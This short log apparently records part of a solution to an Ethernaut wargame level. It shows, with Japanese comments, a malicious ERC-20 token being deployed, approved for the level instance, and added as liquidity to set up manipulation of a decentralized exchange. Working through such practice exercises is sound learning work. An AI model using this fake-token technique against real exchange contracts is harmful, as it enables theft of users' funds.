//Malicious Token contractをdeploy 
[block:10968868 txIndex:4]from: 0xF6e...f30F5to: EvilToken.(constructor)value: 0 weidata: 0x608...f0033logs: 1hash: 0x7b8...3e3df

//check totalSupply
0:uint256: 1000000000000000000000000

//Developed Contracts approve of spender by address of Ethernaut instanceとamount 10_000_000
[block:10968896 txIndex:2]from: 0xF6e...f30F5to: EvilToken.approve(address,uint256) 0xbdC...836f1value: 0 weidata: 0x095...89680logs: 1hash: 0x1de...33b6e

//copy MaliciousToken Address from Deployed Contract
>MAL = "0xbdCfa3f90d610491445b096AB4c6f474Dbc836f1"
'0xbdCfa3f90d610491445b096AB4c6f474Dbc836f1'

>await contract.add_liquidity(MAL, 100)